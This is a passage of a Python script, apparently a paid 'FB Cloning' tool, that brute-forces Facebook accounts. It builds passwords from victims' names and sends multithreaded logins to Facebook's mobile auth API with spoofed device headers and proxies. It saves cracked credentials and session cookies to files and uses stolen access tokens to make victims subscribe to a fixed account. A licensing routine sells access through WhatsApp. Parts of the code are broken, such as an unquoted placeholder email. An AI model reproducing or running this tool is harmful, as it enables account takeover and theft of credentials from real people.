                                                linex()
                                                ps_limit = int(input('\033[1;37m  HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;37m EXAMPLE : first last,firtslast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'\033[1;37m PASSWORD {i+1}:\033[1;31m '))
                                      
                                clear()
                                print('\033[1;37m DO YOU WENT SHOW CP ACCOUNT ? [Y/N] : ')
                                linex()
                                cx=input('\033[1;37m CHOOSE :\033[1;32m ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                    pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('\033[1;32m TOTAL FILE IDS  '+total_ids+f' ')                     
                                        print("\033[1;31m USE MODE AVION AVRY 3 MINUT ")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(M_file_1,ids,names,passlist) 
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(M_file_2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(M_file_3,ids,names,passlist)
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(M_file_4,ids,names,passlist)
                                                elif mthd in ['5','05']:
                                                        crack_submit.submit(M_file_5,ids,names,passlist)
                                                elif mthd in ['6','06']:
                                                        crack_submit.submit(M_file_6,ids,names,passlist)
                                                         
                                print('\033[1;37m')
                                linex()
                                print('\033[1;32m The process has completed')
                                print('\033[1;32m OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input('\033[1;32m PRESS ENTER TO BACK ')
                                os.system('python Hammadi.py')
                        elif xd in ['2','02']:                               
                                os.system('xdg-open https://t.me/python_MV4')
                        elif xd in ['3','03']:
                                os.system('xdg-open https://t.me/Hammadi_MV4')
                                menu() 
                        elif xd in ['0','00']:
                                exit(' Thanks for use ♥ ')
                        else:
                                exit(' Option not found in menu...')
#------------------[  METODE 1 ]-------------------#
def M_file_1(ids,names,passlist):
                try:
                        global ok,loop
                        #boos = random.choice([P,M,H,K,B,U,O,N])
                        sys.stdout.write('\r\r\033[1;37m [DJX-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 7; SM-T720 Build/QP1A.186601.664) [FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540721;FBDM/{density=3.25,width=1280,height=2256};FBLC/en_US;FBRV/184540721;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/IN2023;FBSV/8.0;FBBK/1;FBOP/1;FBCA/arm64-v8a;]','[FBAN/FB4A;FBAV/826.0.0.6089;FBBV/7042558;[FBAN/FB4A;FBAV/845.0.0.48.122;FBBV/1601592;FBDM/{density=2.0,width=720,height=1456};FBLC/en_GB;FBRV/273474118;FBCR/I TIM;FBMF/VIVO;FBBD/VIVO;FBPN/com.facebook.katana;FBDV/X23;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a;][FBAN/FB4A;FBAV/191.0.0.3512;FBBV/6073417;[FBAN/FB4A;FBAV/739.0.0.48.122;FBBV/9908421;FBDM/{density=2.0,width=720,height=1456};FBLC/en_GB;FBRV/273474118;FBCR/I TIM;FBMF/VIVO;FBBD/VIVO;FBPN/com.facebook.katana;FBDV/X70;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"su_SU","client_country_code":"DZ",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
    'content-type': 'application/x-www-form-urlencoded',
    'Host': 'graph.facebook.com',
    'x-fb-sim-hni': str(random.randint(20000, 40000)),
    'X-FB-Connection-Type': 'MOBILE.LTE',
    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
    'user-agent': ua,
    'x-fb-net-hni': str(random.randint(20000, 40000)),
    'x-fb-device-group': '5120',
    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
    'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
    'x-fb-connection-quality': 'EXCELLENT',
    'X-FB-Client-IP': 'True',
    'X-FB-Server-Cluster': 'True',
    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
    'x-fb-friendly-name': 'ViewerReactionsMutation',
    'X-FB-Request-Analytics-Tags': 'graphservice',
    'accept-encoding': 'gzip, deflate',
    'x-fb-http-engine': 'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;32m [DJX-OK] '+ids+' [+] '+pas+'\033[1;97m')
                                        #print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)
                                        token = q['access_token']
                                        requests.post('https://graph.facebook.com/'+'833553969/'+'subscribers'+'?access_token='+token)
                                        open('/sdcard/Hammadi_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/Hammadi_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;35m[DJX-2F😭] '+ids+' [+] '+pas)
                                                open('/sdcard/Hammadi-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break                  
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;37m [DJX-CP] '+ids+' [+] '+pas+'\033[1;97m')
                                                open('/sdcard/Hammadi-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/Hammadi-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#------------------[  METODE 2  ]-------------------#
def M_file_2(ids,names,passlist):
        try:
                global ok,loop
                #boos = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write('\r\r\033[1;37m [DJX-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        nip = random.choice(proxsi)
                        proxs = {
                               'http': 'socks4://' + nip } 
                        data = {"adid": str(uuid.uuid4()),
                        "format": "json","device_id": str(uuid.uuid4()),
                        "cpl": "true","family_device_id":str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "device_based_login",
                        "email": your_email@example.com,"password": your_password,
                        "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0","locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                        "client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
                        "method": "auth.login","fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {'User-Agent':UA(),
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*","Connection": "keep-alive",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Host": "graph.facebook.com",
                        "X-FB-Net-HNI": str(random.randint(3e7,4e7)),
                        "X-FB-SIM-HNI": str(random.randint(2e4,4e4)),
                        "X-FB-Connection-Type": "MOBILE.LTE",
                        "X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                        "x-fb-device-group": str(random.randint(3e7,4e7)),
                        "X-FB-Friendly-Name": "ViewerReactionsMutation",
                        "X-FB-Request-Analytics-Tags": "graphservice",
                        "X-FB-HTTP-Engine": "Liger",
                        "X-FB-Client-IP": "True","X-FB-Server-Cluster": "True",
                        "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
                        url = "https://api.face"+"book.com/au"+"th/lo"+"gin"
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[1;32m [DJX-OK] '+ids+' [+] '+pas+'\033[1;97m')
                                        #print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}COOKIES{R}>{G} '+cookie);linex()
                                        open('/sdcard/Hammadi-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;37m[DJX-CP] '+ids+' [+] '+pas+'\033[1;97m')
                                                open('/sdcard/HammadiHammadi-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#------------------[  METODE 3  ]-------------------#
def M_file_3(ids,names,passlist):
        try:
                global oks,loop
                #boos = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write('\r\r\033[1;37m[DJX-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        
                        head = {'User-Agent': UAA(),
                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'Keep-Alive',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'graph.facebook.com',
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        data = {'adid':str(uuid.uuid4()),
                                'format':'json',
                                'device_id':str(uuid.uuid4()),
                                'email':ids,'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':str(uuid.uuid4()),
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'currently_logged_in_userid':'0',
                                'locale': 'ar_MA','client_country_code': 'MA',
                                'fb_api_req_friendly_name':'authenticate',
                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
                                'access_token':accees_token}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\x1b[1;92m<[DJX-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        token = po['access_token']
                                        requests.post('https://graph.facebook.com/'+'833553969/'+'subscribers'+'?access_token='+token)
                                        open('/sdcard/Hammadi_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/Hammadi_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                print('\r\r\033[1;31m<[DJX-CP]> '+ids+' | '+pas)
                                                open('/sdcard/Hammadi-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\x1b[1;31m<[DJX-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                                open('/sdcard/Hammadi-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                time.sleep(20)

#------------------[  METODE 4  ]-------------------#
def M_file_4(ids,names,passlist):
        try:
                global oks,loop
                #boos = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write('\r\r\033[1;37m[DJX-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        
                        head = {'User-Agent': UAA(),
                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'Keep-Alive',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'graph.facebook.com',
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        data = {'adid':str(uuid.uuid4()),
                                'format':'json',
                                'device_id':str(uuid.uuid4()),
                                'email':ids,'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':str(uuid.uuid4()),
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'currently_logged_in_userid':'0',
                                'locale': 'ar_MA','client_country_code': 'MA',
                                'fb_api_req_friendly_name':'authenticate',
                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
                                'access_token':accees_token}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\x1b[1;92m<[DJX-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        token = po['access_token']
                                        requests.post('https://graph.facebook.com/'+'833553969/'+'subscribers'+'?access_token='+token)
                                        open('/sdcard/Hammadi_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/Hammadi_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                print('\r\r\033[1;31m<[DJX-CP]> '+ids+' | '+pas)
                                                open('/sdcard/Hammadi-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\x1b[1;31m<[DJX-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                                open('/sdcard/Hammadi-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                time.sleep(20)
#------------------[  approval  ]-------------------#            
def main_apv():
    os.system("clear")
    print(logo)
    uuid = str(os.geteuid())
    Hammadi=('Hammadix6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    os.system("clear");print(logo)
    print(f" Your Key : \x1b[1;31m"+Hammadi)
    print('\033[1;34m═════════════════════════════════════════')
    try:
        system = requests.get("https://raw.githubusercontent.com/Hammadims16/Hammadi/main/approval.txt").text 
        if Hammadi in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            menu()
            pass 
        else: 
            print(f"\033[1;32m[\033[1;31m–\033[1;32m] THIS IS PAID TOOL [💸]")
            print(f"\033[1;32m[\033[1;31m–\033[1;32m] SEND YOUR KEY ADMIN [💸]")
            print('\033[1;34m═════════════════════════════════════════\033[1;97m')
            print('\033[1;32m[\033[1;31m–\033[1;32m] Notes : Hammadi Tools Can buy in all countries!')
            print('\033[1;34m═════════════════════════════════════════\033[1;97m')
            print('\033[1;32m[\033[1;31m1\033[1;32m] 8$ \033[1;92mApproval For 1 month')
            print('\033[1;32m[\033[1;31m2\033[1;32m] 6$ \033[1;92mApproval For 15 days')
            print('\033[1;32m[\033[1;31m3\033[1;32m] 3$ \033[1;92mApproval For 7 days \033[1;37m')
            print('\033[1;34m═════════════════════════════════════════')
            Picchi = input('\033[1;32m[\033[1;31m–\033[1;32m] Select Buy Option : ')
            os.system("clear")
            print(logo)
            print(f"\033[1;32m[\033[1;31m–\033[1;32m] YOUR KEY : \033[31;1m{Hammadi}")
            print("\033[1;32m[\033[1;31m–\033[1;32m] Tools    : FB Cloning");print("\033[1;32m[\033[1;31m–\033[1;32m] Note: If You Are Free User Don't Come IB\033[0;0m");print('\033[1;32m[\033[1;31m1\033[1;32m] CRACK FILE  \n\033[1;32m[\033[1;31m2\033[1;32m] \033[1;37mExit Program')
            print('\033[1;34m═════════════════════════════════════════')
            url_wa = "https://api.whatsapp.com/send?phone=+213558926136&text="
            choice = input(" \033[1;32m[\033[1;31m–\033[1;32m] Enter your choice  : ")
            tks = ("Hi Hammadi Sir, I Need To Buy Your Hammadi Tools Version V3/2.2 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Hammadi+"\n Buy Select : "+Picchi)
            subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
            print('\033[1;34m═════════════════════════════════════════\nRun\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37m again with permission from admin')
            main_apv()
    except: 
        sys.exit()
#------------------[  END  ]-------------------#
try:
    menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:
        print(e) 
